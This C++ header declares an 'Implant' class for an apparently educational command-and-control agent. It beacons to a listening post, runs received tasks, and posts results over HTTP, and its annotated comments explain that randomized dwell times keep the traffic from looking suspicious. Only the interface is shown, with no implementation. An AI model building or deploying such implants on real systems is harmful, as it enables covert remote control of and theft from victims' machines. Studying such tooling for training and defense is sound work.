#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>

#include <boost/property_tree/ptree.hpp>

struct Implant {
	// Our implant constructor
	Implant(std::string host, std::string port, std::string uri);
	// The thread for servicing tasks --> will allow us to perform work asynchronously
	std::future<void> taskThread;
	// Our public functions that the implant exposes
	void beacon(); //--> beaconing loop to hold constant communication with server
	void setMeanDwell(double meanDwell); //--> wait time btwn each beacon
	void setRunning(bool isRunning); //-->either on or off
	void serviceTasks(); //--> this is the one that goes through all the tasks received and perform them

private:
	// Listening post endpoint args
	const std::string host, port, uri; //(the ones in main.cpp --> can be changed)
	// Variables for implant config, dwell time 
	std::exponential_distribution<double> dwellDistributionSeconds;
    //uses exponential distibution to produce a diff num of secs to dwell for
    //removes communication being constant --> prob bc it is seen as suspicious 
	
    // bool for running status
    std::atomic_bool isRunning;
	
    // Define our mutexes since we're doing async I/O stuff
	std::mutex taskMutex, resultsMutex;
	
    // Where we store our results
	boost::property_tree::ptree results;
	
    // Where we store our tasks
	std::vector<Task> tasks;
	
    // Generate random device
	std::random_device device;

	void parseTasks(const std::string& response);
	[[nodiscard]] std::string sendResults();
    //[nodiscard] means that if the function return value is not used, then the compiler will throw a warning 
    //bc something is wrong (we always expect to see the return value)
};

//make HTTP requests to the listening post
//3 atrtibutes from the main function
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port, 
	std::string_view uri,
	std::string_view payload); //--> what we want to send (results)


